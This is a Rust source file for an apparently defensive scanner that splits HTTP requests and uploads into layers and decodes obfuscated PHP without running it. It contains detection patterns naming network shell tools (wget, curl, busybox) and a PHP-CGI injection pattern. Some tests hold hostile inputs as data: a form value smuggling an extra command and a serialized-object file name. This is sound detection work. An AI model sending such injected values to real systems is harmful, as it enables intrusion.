//! The entry point and the container readers: a request's query and body,
//! or an upload's text, are cut into their parts (form fields, multipart
//! fields, JSON strings, XML text, PHP blocks and the calls inside them)
//! and each part becomes a layer, so the decoders and the rules see what
//! is inside. Everything is text patterns and plain parsers; nothing found
//! is executed, fetched or resolved. Every layer goes through the same
//! budget checks as the decoders' (`decode::open`).

use std::collections::VecDeque;
use std::sync::LazyLock;

use regex::bytes::Regex;
use serde::de::IgnoredAny;
use serde_json::Value;

use super::{Budget, Layer, LayerKind, OpaqueReason, Policy, Span, Xray, decode, pieces, shell};

/// Where the text comes from. `method`, `path` and `sender` are read by the
/// piece extractor only.
pub enum Source<'a> {
    Request {
        method: &'a str,
        path: &'a str,
        query: Option<&'a str>,
        body: Option<&'a [u8]>,
        sender: Option<&'a str>,
    },
    Upload {
        name: Option<&'a str>,
        text: &'a [u8],
        sender: Option<&'a str>,
    },
}

/// Most pieces of text one reader takes from one layer.
const MAX_PARTS: usize = 256;

/// Fewest same-stem numbered fields that count as padding.
const COLLAPSE_MIN: usize = 3;

/// Fewest `chr()` calls in a run.
const CHR_MIN: usize = 3;

static CONTENT_DISPOSITION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?im-u)^content-disposition:").expect("static regex"));
static PHP_BLOCK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is-u)<\?(?:php|=)(.*?)(?:\?>|\z)").expect("static regex"));
/// `-d allow_url_include=1`, with the soft hyphen (0xAD) CVE-2012-1823
/// style requests use for the dash.
static PHP_CGI: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?-u)(?:^|[ \t])(?:\xAD|-)d[ \t]*[A-Za-z_]+[ \t]*=").expect("static regex")
});
/// `f(g('literal'` : a chain of calls around one string literal.
static CALL_CHAIN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?s-u)((?:[A-Za-z0-9_]+\s*\(\s*)+)(?:'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)")"#)
        .expect("static regex")
});
static JSON_STRING: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?s-u)"(?:[^"\\]|\\.)*""#).expect("static regex"));
static IDENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?-u)[A-Za-z0-9_]+").expect("static regex"));
static CHR_RUN: LazyLock<Regex> = LazyLock::new(|| {
    let one = r"chr\s*\(\s*(?:0x[0-9a-f]{1,2}|[0-9]{1,3})\s*\)";
    Regex::new(&format!(r"(?i-u){one}(?:\s*\.\s*{one})+")).expect("static regex")
});
static CHR_ONE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i-u)chr\s*\(\s*(0x[0-9a-f]{1,2}|[0-9]{1,3})").expect("static regex")
});
/// A word shell text would hold. `x.sh` and `ssh` are not `sh`.
static SHELL_WORD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?-u)(?:^|[^A-Za-z0-9_.-])(?:wget|curl|tftp|ftpget|scp|busybox|sh|bash|ash|chmod|eval|python[23]?|perl)(?:[^A-Za-z0-9_-]|$)",
    )
    .expect("static regex")
});

/// Parse `source` into its layers.
pub fn parse(source: Source<'_>, policy: &Policy) -> Xray {
    let (body, query, name) = match source {
        Source::Request { query, body, .. } => (body.unwrap_or(&[]), query, None),
        Source::Upload { name, text, .. } => (text, None, name),
    };
    let mut xray = Xray::new(body);
    xray.layers[0].name = name.map(|n| n.as_bytes().to_vec());
    let mut budget = Budget::default();

    let mut body_is_php = false;
    if let Some(query) = query.filter(|q| !q.is_empty())
        && let Some(at) = add(
            &mut xray,
            0,
            LayerKind::Query,
            None,
            query.as_bytes().to_vec(),
            None,
            0,
            &mut budget,
        )
    {
        let before = at;
        body_is_php = read_query(&mut xray, at, &mut budget);
        settle(&mut xray, before, &mut budget);
    }

    xray.php_body = body_is_php;
    let mut i = 0;
    while i < xray.layers.len() {
        let before = xray.layers.len();
        if i == 0 && body_is_php {
            // The whole body is PHP: the decoders go first so the call
            // reader finds their layers and does not repeat them.
            decode::decode_all(&mut xray, 0, &mut budget);
            let text = xray.layers[0].text.clone();
            php_calls(&mut xray, 0, &text, &mut budget);
            settle(&mut xray, before, &mut budget);
        } else {
            read_layer(&mut xray, i, &mut budget);
            settle(&mut xray, before, &mut budget);
            // Text already open is not opened twice, so the whole of layer
            // 0 is scanned too: what sits outside the parts is not missed.
            if i == 0 {
                decode::decode_all(&mut xray, 0, &mut budget);
            }
        }
        i += 1;
    }
    read_shell(&mut xray, &mut budget);
    pieces::extract(&mut xray, &source, policy, &mut budget);
    xray
}

/// Read the recipes. Every `Shell` layer open by now holds the text of a PHP
/// shell function. The ones the shell reader opens come after them, and it
/// reads those itself. Other text is read only with a word of shell in it,
/// so prose costs no steps and no false limit. A container is read through
/// its parts: as one text, its syntax only gives false steps.
fn read_shell(xray: &mut Xray, budget: &mut Budget) {
    let mut container = vec![false; xray.layers.len()];
    for layer in &xray.layers {
        let Some(parent) = layer.parent else { continue };
        container[parent] |= match layer.kind {
            LayerKind::Form | LayerKind::MultipartField | LayerKind::Xml => true,
            // `[ "$a" = x ] && …` opens like JSON and has strings too.
            LayerKind::Json => {
                !container[parent]
                    && serde_json::from_slice::<IgnoredAny>(&xray.layers[parent].text).is_ok()
            }
            _ => false,
        };
    }
    for (at, container) in container.into_iter().enumerate() {
        let layer = &xray.layers[at];
        if layer.kind == LayerKind::Shell || (!container && SHELL_WORD.is_match(&layer.text)) {
            shell::read_recipes(xray, at, budget);
        }
    }
}

/// Run the decoders over the layers added since `from`.
fn settle(xray: &mut Xray, from: usize, budget: &mut Budget) {
    for at in from..xray.layers.len().min(budget.layers) {
        if at < xray.layers.len() {
            decode::decode_all(xray, at, budget);
        }
    }
}

/// Record that the rest of `layer` was not read.
fn overflow(xray: &mut Xray, layer: usize) {
    let end = xray.layers[layer].text.len();
    let at = Span {
        layer,
        start: 0,
        end,
    };
    decode::push_opaque(xray, at, OpaqueReason::OverLimit);
}

fn full(xray: &Xray, budget: &Budget) -> bool {
    xray.layers.len() >= budget.layers
}

/// Add a child layer through the shared limits. `from` is where in the
/// parent the text sits, when that is known. Empty text and text the parent
/// already has as a child are not added.
#[allow(clippy::too_many_arguments)]
fn add(
    xray: &mut Xray,
    parent: usize,
    kind: LayerKind,
    from: Option<Span>,
    bytes: Vec<u8>,
    name: Option<Vec<u8>>,
    collapsed: usize,
    budget: &mut Budget,
) -> Option<usize> {
    if bytes.is_empty() {
        return None;
    }
    // The same text under the same parent is one layer; a second field
    // name for it is a layer of its own, so the name is not lost.
    let same = |l: &Layer| {
        l.parent == Some(parent) && l.text == bytes && (name.is_none() || l.name == name)
    };
    if let Some(l) = xray.layers.iter_mut().find(|l| same(l)) {
        // A decoded run that is also what `eval` runs is PHP.
        if kind == LayerKind::Php
            && matches!(
                l.kind,
                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
            )
        {
            l.kind = LayerKind::Php;
        }
        return None;
    }
    // Decoded text that is also what `eval` runs is PHP, wherever it is.
    if kind == LayerKind::Php
        && let Some(l) = xray.layers.iter_mut().find(|l| {
            l.text == bytes
                && matches!(
                    l.kind,
                    LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
                )
        })
    {
        l.kind = LayerKind::Php;
        return None;
    }
    let before = xray.layers.len();
    let at = from.unwrap_or(Span {
        layer: parent,
        start: 0,
        end: xray.layers[parent].text.len(),
    });
    // A layer kept under its own name is opened even if the text is open.
    budget.dedupe = name.is_none();
    decode::open(xray, parent, kind, at, bytes, budget, &mut VecDeque::new());
    budget.dedupe = true;
    if xray.layers.len() == before {
        return None;
    }
    let layer = &mut xray.layers[before];
    layer.from = from;
    layer.name = name;
    layer.collapsed = collapsed;
    Some(before)
}

/// A named piece of a container.
pub(super) struct Field {
    pub(super) name: Vec<u8>,
    value: Vec<u8>,
    span: Span,
}

/// Percent-decode; `+` is a space in forms and queries.
fn pct_decode(bytes: &[u8], plus: bool) -> Vec<u8> {
    let digit = |b: u8| char::from(b).to_digit(16).map(|d| d as u8);
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len()
                && digit(bytes[i + 1]).is_some()
                && digit(bytes[i + 2]).is_some() =>
            {
                out.push(digit(bytes[i + 1]).unwrap_or(0) << 4 | digit(bytes[i + 2]).unwrap_or(0));
                i += 3;
                continue;
            }
            b'+' if plus => out.push(b' '),
            b => out.push(b),
        }
        i += 1;
    }
    out
}

/// `k=v&k=v` as fields, decoded; `layer` is the text's layer.
pub(super) fn form_fields(text: &[u8], layer: usize) -> Vec<Field> {
    let mut fields = Vec::new();
    let mut start = 0;
    for part in text.split(|&b| b == b'&') {
        let end = start + part.len();
        // A part without `=` is all value.
        let eq = part.iter().position(|&b| b == b'=');
        let skip = eq.map_or(0, |eq| eq + 1);
        if !part.is_empty() {
            fields.push(Field {
                name: eq.map_or_else(Vec::new, |eq| pct_decode(&part[..eq], true)),
                value: pct_decode(&part[skip..], true),
                span: Span {
                    layer,
                    start: start + skip,
                    end,
                },
            });
        }
        start = end + 1;
        if fields.len() > MAX_PARTS {
            break;
        }
    }
    fields
}

/// Add the fields as layers, folding runs of random-padding fields into
/// their first.
fn emit_fields(
    xray: &mut Xray,
    parent: usize,
    kind: LayerKind,
    mut fields: Vec<Field>,
    budget: &mut Budget,
) {
    if fields.len() > MAX_PARTS {
        fields.truncate(MAX_PARTS);
        overflow(xray, parent);
    }
    let mut i = 0;
    while i < fields.len() {
        if full(xray, budget) {
            return overflow(xray, parent);
        }
        let run = padding_run(&fields[i..]);
        let f = &fields[i];
        add(
            xray,
            parent,
            kind,
            Some(f.span),
            f.value.clone(),
            Some(f.name.clone()),
            if run >= COLLAPSE_MIN { run } else { 0 },
            budget,
        );
        i += if run >= COLLAPSE_MIN { run } else { 1 };
    }
}

/// Random padding: alphanumeric, mixed classes, not short, and nothing
/// the decoders would open.
fn noise(v: &[u8]) -> bool {
    let has = |f: fn(&u8) -> bool| v.iter().any(f);
    let classes = [
        has(u8::is_ascii_lowercase),
        has(u8::is_ascii_uppercase),
        has(u8::is_ascii_digit),
    ];
    v.len() >= 5
        && v.iter().all(u8::is_ascii_alphanumeric)
        && classes.iter().filter(|&&c| c).count() >= 2
        && !opens(v)
}

fn opens(v: &[u8]) -> bool {
    (v.len() >= 16 && decode::base64_lenient(v).is_some_and(|b| decode::worth_opening(&b)))
        || (v.len() >= 32 && decode::hex_bytes(v).is_some_and(|b| decode::worth_opening(&b)))
}

/// How many fields from the start share a stem (name minus trailing
/// digits) and hold values of similar length that look like noise. Any
/// other value is kept as a layer of its own.
fn padding_run(fields: &[Field]) -> usize {
    let stem = |n: &[u8]| {
        let cut = n
            .iter()
            .rposition(|b| !b.is_ascii_digit())
            .map_or(0, |p| p + 1);
        (cut > 0 && cut < n.len()).then(|| n[..cut].to_vec())
    };
    let Some(first) = stem(&fields[0].name) else {
        return 1;
    };
    let len = fields[0].value.len();
    fields
        .iter()
        .take_while(|f| {
            stem(&f.name).as_ref() == Some(&first)
                && noise(&f.value)
                && f.value.len() * 2 >= len
                && len * 2 >= f.value.len()
        })
        .count()
        .max(1)
}

/// Read the query layer `at`. True when it is a PHP-CGI option injection,
/// which makes the body PHP.
fn read_query(xray: &mut Xray, at: usize, budget: &mut Budget) -> bool {
    let text = xray.layers[at].text.clone();
    let decoded = pct_decode(&text, true);
    let mut php_cgi = false;
    if PHP_CGI.is_match(&decoded) {
        add(xray, at, LayerKind::PhpCgi, None, decoded, None, 0, budget);
        php_cgi = true;
    }
    let fields = form_fields(&text, at);
    emit_fields(xray, at, LayerKind::Form, fields, budget);
    php_blocks(xray, at, &decoded_text(&text), budget);
    php_cgi
}

/// A query is read decoded for `<?php` blocks.
fn decoded_text(text: &[u8]) -> Vec<u8> {
    pct_decode(text, true)
}

/// Find what is inside layer `i` by its look.
fn read_layer(xray: &mut Xray, i: usize, budget: &mut Budget) {
    if full(xray, budget) {
        return overflow(xray, i);
    }
    let kind = xray.layers[i].kind;
    let text = xray.layers[i].text.clone();
    match kind {
        LayerKind::Php => return php_calls(xray, i, &text, budget),
        LayerKind::PhpCgi | LayerKind::Shell | LayerKind::Query => return,
        _ => {}
    }
    let (start, end) = trim(&text);
    let head = &text[start..end];
    if CONTENT_DISPOSITION.is_match(head) {
        return multipart(xray, i, &text, budget);
    }
    if matches!(head.first(), Some(b'{' | b'[' | b'"')) {
        return json_strings(xray, i, head, budget);
    }
    let lower: Vec<u8> = head.iter().take(16).map(u8::to_ascii_lowercase).collect();
    let xml = lower.starts_with(b"<?xml")
        || lower.starts_with(b"<!doctype")
        || (head.first() == Some(&b'<')
            && !lower.starts_with(b"<?")
            && (contains(head, b"</") || contains(head, b"/>")));
    if xml {
        xml_texts(xray, i, &text, budget);
    }
    php_blocks(xray, i, &text, budget);
    if !xml && i == 0 && kind == LayerKind::Raw && looks_like_form(head) {
        let fields = form_fields(&text, i);
        emit_fields(xray, i, LayerKind::Form, fields, budget);
    }
}

/// `<?php ... ?>` blocks of `text`, the text of layer `parent`.
fn php_blocks(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
    for (n, m) in PHP_BLOCK.captures_iter(text).enumerate() {
        if full(xray, budget) || n >= MAX_PARTS {
            return overflow(xray, parent);
        }
        if let Some(g) = m.get(1) {
            let span = Span {
                layer: parent,
                start: g.start(),
                end: g.end(),
            };
            add(
                xray,
                parent,
                LayerKind::Php,
                Some(span),
                g.as_bytes().to_vec(),
                None,
                0,
                budget,
            );
        }
    }
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    find(hay, needle).is_some()
}

fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len()).position(|w| w == needle)
}

/// Range of `text` without surrounding ASCII whitespace.
fn trim(text: &[u8]) -> (usize, usize) {
    let start = text
        .iter()
        .position(|b| !b.is_ascii_whitespace())
        .unwrap_or(text.len());
    let end = text
        .iter()
        .rposition(|b| !b.is_ascii_whitespace())
        .map_or(start, |p| p + 1);
    (start, end)
}

fn looks_like_form(head: &[u8]) -> bool {
    !head.is_empty()
        && !head.contains(&b'\n')
        && head.split(|&b| b == b'&').all(|seg| {
            seg.is_empty()
                || seg.iter().position(|&b| b == b'=').is_some_and(|eq| {
                    eq > 0
                        && seg[..eq]
                            .iter()
                            .all(|&b| b.is_ascii_alphanumeric() || b"_.[]%+-".contains(&b))
                })
        })
}

/// Multipart, by the boundary line or, with none, by the
/// `Content-Disposition` lines alone.
fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
    let starts: Vec<usize> = CONTENT_DISPOSITION
        .find_iter(text)
        .take(MAX_PARTS + 1)
        .map(|m| m.start())
        .collect();
    let boundary = text_boundary(text);
    let mut fields = Vec::new();
    let mut names = Vec::new();
    for (n, &s) in starts.iter().enumerate() {
        let e = starts.get(n + 1).copied().unwrap_or(text.len());
        let seg = &text[s..e];
        let (head_end, sep) = ["\r\n\r\n", "\n\n"]
            .iter()
            .filter_map(|sep| find(seg, sep.as_bytes()).map(|p| (p, sep.len())))
            .min()
            .unwrap_or((seg.len(), 0));
        let head = &seg[..head_end];
        let line = head.split(|&b| b == b'\n').next().unwrap_or(head);
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        let file = param(line, b"filename", true);
        let name = param(line, b"name", false);
        let body_start = (head_end + sep).min(seg.len());
        let body_end = body_start + content_len(&seg[body_start..], boundary);
        let span = Span {
            layer: parent,
            start: s + body_start,
            end: s + body_end,
        };
        if let Some(file) = &file
            && !file
                .iter()
                .all(|&b| b.is_ascii_alphanumeric() || b"._- ".contains(&b))
        {
            names.push(file.clone());
        }
        fields.push(Field {
            name: file.or(name).unwrap_or_default(),
            value: seg[body_start..body_end].to_vec(),
            span,
        });
    }
    emit_fields(xray, parent, LayerKind::MultipartField, fields, budget);
    // A file name that is more than a name is read as text of its own.
    for file in names {
        if full(xray, budget) {
            return overflow(xray, parent);
        }
        let name = Some(file.clone());
        add(
            xray,
            parent,
            LayerKind::MultipartField,
            None,
            file,
            name,
            0,
            budget,
        );
    }
}

/// The boundary line (with its dashes) when the text opens with one.
fn text_boundary(text: &[u8]) -> Option<&[u8]> {
    let (start, _) = trim(text);
    let line = text[start..].split(|&b| b == b'\n').next()?;
    let line = line.strip_suffix(b"\r").unwrap_or(line);
    (line.starts_with(b"--") && line.len() > 2 && !line.iter().any(u8::is_ascii_whitespace))
        .then_some(line)
}

/// Length of a part's content: up to the trailing boundary line, minus the
/// line break before it.
fn content_len(content: &[u8], boundary: Option<&[u8]>) -> usize {
    let (_, end) = trim(content);
    let tail_start = content[..end]
        .iter()
        .rposition(|&b| b == b'\n')
        .map_or(0, |p| p + 1);
    let tail = &content[tail_start..end];
    if boundary.is_some_and(|b| tail.starts_with(b)) {
        let cut = &content[..tail_start];
        let cut = cut.strip_suffix(b"\n").unwrap_or(cut);
        cut.strip_suffix(b"\r").unwrap_or(cut).len()
    } else {
        let cut = content.strip_suffix(b"\n").unwrap_or(content);
        cut.strip_suffix(b"\r").unwrap_or(cut).len()
    }
}

/// The value of `key="..."` in a header line. A file name may hold quotes
/// itself, so it runs to the last quote of the line.
fn param(line: &[u8], key: &[u8], to_last_quote: bool) -> Option<Vec<u8>> {
    let mut pat = key.to_vec();
    pat.extend_from_slice(b"=\"");
    let mut from = 0;
    while let Some(p) = find(&line[from..], &pat) {
        let at = from + p;
        let boundary = at == 0 || !line[at - 1].is_ascii_alphanumeric();
        if boundary {
            let rest = &line[at + pat.len()..];
            let end = if to_last_quote {
                rest.iter().rposition(|&b| b == b'"')
            } else {
                rest.iter().position(|&b| b == b'"')
            }
            .unwrap_or(rest.len());
            return Some(rest[..end].to_vec());
        }
        from = at + 1;
    }
    None
}

/// Every string of a JSON document, keys included, in document order,
/// then every string literal of the raw text (what a parser drops:
/// repeated keys, text after the document, a bare string).
fn json_strings(xray: &mut Xray, parent: usize, head: &[u8], budget: &mut Budget) {
    let mut parts = 0;
    if let Ok(value) = serde_json::from_slice::<Value>(head) {
        let mut stack: Vec<(&Value, Option<&str>)> = vec![(&value, None)];
        while let Some((v, key)) = stack.pop() {
            if full(xray, budget) || parts >= MAX_PARTS {
                return overflow(xray, parent);
            }
            match v {
                Value::String(s) => {
                    parts += 1;
                    let name = key.map(|k| k.as_bytes().to_vec());
                    add(
                        xray,
                        parent,
                        LayerKind::Json,
                        None,
                        s.as_bytes().to_vec(),
                        name,
                        0,
                        budget,
                    );
                }
                Value::Array(items) => stack.extend(items.iter().rev().map(|v| (v, key))),
                Value::Object(map) => {
                    for (k, v) in map.iter().rev() {
                        stack.push((v, Some(k)));
                    }
                    // Keys are read too.
                    for k in map.keys() {
                        parts += 1;
                        let k = k.as_bytes().to_vec();
                        add(xray, parent, LayerKind::Json, None, k, None, 0, budget);
                    }
                }
                _ => {}
            }
        }
    }
    for lit in JSON_STRING.find_iter(head) {
        if full(xray, budget) || parts >= 2 * MAX_PARTS {
            return overflow(xray, parent);
        }
        parts += 1;
        if let Ok(s) = serde_json::from_slice::<String>(lit.as_bytes()) {
            add(
                xray,
                parent,
                LayerKind::Json,
                None,
                s.into_bytes(),
                None,
                0,
                budget,
            );
        }
    }
}

/// Text, CDATA, attribute values and the doctype of an XML document.
fn xml_texts(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
    let n = text.len();
    let mut i = 0;
    let mut tag: Option<Vec<u8>> = None;
    let mut parts = 0;
    let push = |xray: &mut Xray,
                budget: &mut Budget,
                start: usize,
                end: usize,
                raw: bool,
                tag: &Option<Vec<u8>>| {
        let (s, e) = trim(&text[start..end]);
        if s >= e {
            return;
        }
        let seg = &text[start + s..start + e];
        let bytes = if raw { seg.to_vec() } else { entities(seg) };
        let span = Span {
            layer: parent,
            start: start + s,
            end: start + e,
        };
        add(
            xray,
            parent,
            LayerKind::Xml,
            Some(span),
            bytes,
            tag.clone(),
            0,
            budget,
        );
    };
    while i < n {
        if parts >= MAX_PARTS || full(xray, budget) {
            return overflow(xray, parent);
        }
        parts += 1;
        let rest = &text[i..];
        if text[i] != b'<' {
            let end = rest.iter().position(|&b| b == b'<').map_or(n, |p| i + p);
            push(xray, budget, i, end, false, &tag);
            i = end;
        } else if rest.starts_with(b"<!--") {
            i = find(rest, b"-->").map_or(n, |p| i + p + 3);
        } else if rest.starts_with(b"<![CDATA[") {
            let end = find(rest, b"]]>").map_or(n, |p| i + p);
            push(xray, budget, i + 9, end.max(i + 9), true, &tag);
            i = (end + 3).min(n);
        } else if rest.starts_with(b"<?") {
            i = find(rest, b"?>").map_or(n, |p| i + p + 2);
        } else if rest.starts_with(b"<!") {
            let mut depth = 0usize;
            let mut j = i + 2;
            while j < n && !(text[j] == b'>' && depth == 0) {
                match text[j] {
                    b'[' => depth += 1,
                    b']' => depth = depth.saturating_sub(1),
                    _ => {}
                }
                j += 1;
            }
            push(xray, budget, i + 2, j, true, &tag);
            i = (j + 1).min(n);
        } else {
            let closing = rest.get(1) == Some(&b'/');
            let name_start = i + 1 + usize::from(closing);
            let name_end = text[name_start.min(n)..]
                .iter()
                .position(|&b| !(b.is_ascii_alphanumeric() || b"_:-.".contains(&b)))
                .map_or(n, |p| name_start + p);
            if !closing {
                tag = Some(text[name_start.min(n)..name_end].to_vec());
            }
            let mut j = i + 1;
            let mut quote: Option<(u8, usize)> = None;
            while j < n {
                let b = text[j];
                match quote {
                    Some((q, qs)) if b == q => {
                        push(xray, budget, qs, j, false, &tag);
                        quote = None;
                    }
                    Some(_) => {}
                    None if b == b'>' => break,
                    None if b == b'"' || b == b'\'' => quote = Some((b, j + 1)),
                    None => {}
                }
                j += 1;
            }
            i = (j + 1).min(n);
        }
    }
}

/// XML character and entity references.
fn entities(seg: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(seg.len());
    let mut i = 0;
    while i < seg.len() {
        if seg[i] == b'&'
            && let Some(semi) = seg[i..].iter().take(10).position(|&b| b == b';')
        {
            let name = &seg[i + 1..i + semi];
            let ch: Option<char> = match name {
                b"lt" => Some('<'),
                b"gt" => Some('>'),
                b"amp" => Some('&'),
                b"quot" => Some('"'),
                b"apos" => Some('\''),
                [b'#', b'x' | b'X', hex @ ..] => std::str::from_utf8(hex)
                    .ok()
                    .and_then(|h| u32::from_str_radix(h, 16).ok())
                    .and_then(char::from_u32),
                [b'#', dec @ ..] => std::str::from_utf8(dec)
                    .ok()
                    .and_then(|d| d.parse::<u32>().ok())
                    .and_then(char::from_u32),
                _ => None,
            };
            if let Some(ch) = ch {
                let mut buf = [0u8; 4];
                out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                i += semi + 1;
                continue;
            }
        }
        out.push(seg[i]);
        i += 1;
    }
    out
}

/// What the call chains and `chr()` runs of PHP text open up.
fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
    let mut inflate_left = super::MAX_OUTPUT;
    for (n, caps) in CALL_CHAIN.captures_iter(text).enumerate() {
        if full(xray, budget) || n >= MAX_PARTS {
            return overflow(xray, parent);
        }
        let (Some(whole), Some(calls)) = (caps.get(0), caps.get(1)) else {
            continue;
        };
        let (literal, quote) = match (caps.get(2), caps.get(3)) {
            (Some(s), _) => (s.as_bytes(), b'\''),
            (_, Some(d)) => (d.as_bytes(), b'"'),
            _ => continue,
        };
        let mut bytes = unescape(literal, quote);
        let mut kind = None;
        let names: Vec<String> = IDENT
            .find_iter(calls.as_bytes())
            .map(|m| String::from_utf8_lossy(m.as_bytes()).to_ascii_lowercase())
            .collect();
        // The innermost call runs first.
        for name in names.iter().rev().take(super::MAX_DEPTH) {
            let limit = budget.output.min(inflate_left);
            let step = match name.as_str() {
                "base64_decode" => decode::base64_lenient(&bytes).map(|b| (b, LayerKind::Base64)),
                "gzinflate" => decode::inflate_raw(&bytes, limit).map(|b| (b, LayerKind::Gzip)),
                "gzuncompress" => decode::inflate_zlib(&bytes, limit).map(|b| (b, LayerKind::Gzip)),
                "hex2bin" => decode::hex_bytes(&bytes).map(|b| (b, LayerKind::Hex)),
                "str_rot13" => Some((rot13(&bytes), LayerKind::Escapes)),
                "strrev" => Some((bytes.iter().rev().copied().collect(), LayerKind::Escapes)),
                "urldecode" | "rawurldecode" => {
                    Some((pct_decode(&bytes, name == "urldecode"), LayerKind::Escapes))
                }
                "eval" | "assert" => {
                    kind = Some(LayerKind::Php);
                    break;
                }
                "system" | "shell_exec" | "exec" | "passthru" | "popen" | "proc_open" => {
                    kind = Some(LayerKind::Shell);
                    break;
                }
                // Any other call ends the chain.
                _ => break,
            };
            let Some((next, k)) = step else {
                kind = None;
                bytes.clear();
                break;
            };
            if matches!(k, LayerKind::Gzip) {
                inflate_left = inflate_left.saturating_sub(next.len());
            }
            bytes = next;
            kind = Some(k);
        }
        let Some(kind) = kind else { continue };
        if bytes.is_empty() || (kind != LayerKind::Php && !decode::worth_opening(&bytes)) {
            continue;
        }
        let span = Span {
            layer: parent,
            start: whole.start(),
            end: whole.end(),
        };
        add(xray, parent, kind, Some(span), bytes, None, 0, budget);
    }
    for (n, run) in CHR_RUN.find_iter(text).enumerate() {
        if full(xray, budget) || n >= MAX_PARTS {
            return overflow(xray, parent);
        }
        let bytes: Vec<u8> = CHR_ONE
            .captures_iter(run.as_bytes())
            .filter_map(|c| {
                let num = std::str::from_utf8(c.get(1)?.as_bytes()).ok()?;
                let n = match num.strip_prefix("0x").or_else(|| num.strip_prefix("0X")) {
                    Some(h) => u32::from_str_radix(h, 16).ok()?,
                    None => num.parse().ok()?,
                };
                Some((n % 256) as u8)
            })
            .collect();
        if bytes.len() >= CHR_MIN {
            let span = Span {
                layer: parent,
                start: run.start(),
                end: run.end(),
            };
            add(
                xray,
                parent,
                LayerKind::Escapes,
                Some(span),
                bytes,
                None,
                0,
                budget,
            );
        }
    }
}

fn rot13(bytes: &[u8]) -> Vec<u8> {
    bytes
        .iter()
        .map(|&b| match b {
            b'a'..=b'z' => (b - b'a' + 13) % 26 + b'a',
            b'A'..=b'Z' => (b - b'A' + 13) % 26 + b'A',
            b => b,
        })
        .collect()
}

/// A PHP string literal's value: `\\` and the quote in both kinds, the
/// usual escapes in double quotes.
fn unescape(lit: &[u8], quote: u8) -> Vec<u8> {
    let mut out = Vec::with_capacity(lit.len());
    let mut i = 0;
    while i < lit.len() {
        if lit[i] == b'\\' && i + 1 < lit.len() {
            let c = lit[i + 1];
            let mapped = match (quote, c) {
                (_, b'\\') => Some(b'\\'),
                (b'\'', b'\'') | (b'"', b'"') => Some(c),
                (b'"', b'n') => Some(b'\n'),
                (b'"', b'r') => Some(b'\r'),
                (b'"', b't') => Some(b'\t'),
                (b'"', b'$') => Some(b'$'),
                _ => None,
            };
            if let Some(m) = mapped {
                out.push(m);
                i += 2;
                continue;
            }
        }
        out.push(lit[i]);
        i += 1;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::xray::OpaqueReason;
    use flate2::Compression;
    use flate2::write::DeflateEncoder;
    use std::io::Write;

    fn request(query: Option<&str>, body: Option<&[u8]>) -> Xray {
        parse(
            Source::Request {
                method: "POST",
                path: "/index.php",
                query,
                body,
                sender: Some("192.0.2.7"),
            },
            Policy::embedded(),
        )
    }

    fn find_layer<'a>(x: &'a Xray, kind: LayerKind, text: &[u8]) -> Option<&'a Layer> {
        x.layers.iter().find(|l| l.kind == kind && l.text == text)
    }

    fn has_text(x: &Xray, text: &[u8]) -> bool {
        x.layers.iter().any(|l| l.text == text)
    }

    #[test]
    fn query_values_are_decoded() {
        let x = request(Some("a=%3Cb%3E&c=hello+world"), None);
        let c = find_layer(&x, LayerKind::Form, b"hello world").expect("c");
        assert_eq!(c.name.as_deref(), Some(&b"c"[..]));
        assert!(find_layer(&x, LayerKind::Form, b"<b>").is_some());
        assert_eq!(x.layers[c.parent.unwrap()].kind, LayerKind::Query);
    }

    #[test]
    fn form_values_are_decoded() {
        let x = request(None, Some(b"user=admin&cmd=ls%20-la%3B+id"));
        assert!(find_layer(&x, LayerKind::Form, b"ls -la; id").is_some());
        assert!(find_layer(&x, LayerKind::Form, b"admin").is_some());
    }

    #[test]
    fn multipart_fields_are_layers() {
        let body = b"--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nhello\r\n--b\r\nContent-Disposition: form-data; name=\"b\"\r\n\r\nworld\r\n--b--\r\n";
        let x = request(None, Some(body));
        let a = find_layer(&x, LayerKind::MultipartField, b"hello").expect("a");
        assert_eq!(a.name.as_deref(), Some(&b"a"[..]));
        assert!(find_layer(&x, LayerKind::MultipartField, b"world").is_some());
    }

    #[test]
    fn multipart_without_boundary_line() {
        let body = b"Content-Disposition: form-data; name=\"x\"\r\n\r\n<?php echo 1; ?>\r\n";
        let x = request(None, Some(body));
        assert!(find_layer(&x, LayerKind::MultipartField, b"<?php echo 1; ?>").is_some());
        assert!(find_layer(&x, LayerKind::Php, b" echo 1; ").is_some());
    }

    #[test]
    fn multipart_file_name_is_read() {
        let file = b"p2s|O:8:\"stdClass\":0:{}";
        let mut body = b"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"".to_vec();
        body.extend_from_slice(file);
        body.extend_from_slice(b"\"\r\nContent-Type: text/plain\r\n\r\ndata\r\n--b--\r\n");
        let x = request(None, Some(&body));
        let layer = find_layer(&x, LayerKind::MultipartField, b"data").expect("data");
        assert_eq!(layer.name.as_deref(), Some(&file[..]));
        assert!(find_layer(&x, LayerKind::MultipartField, file).is_some());
    }

    #[test]
    fn random_padding_fields_collapse() {
        let mut body = Vec::new();
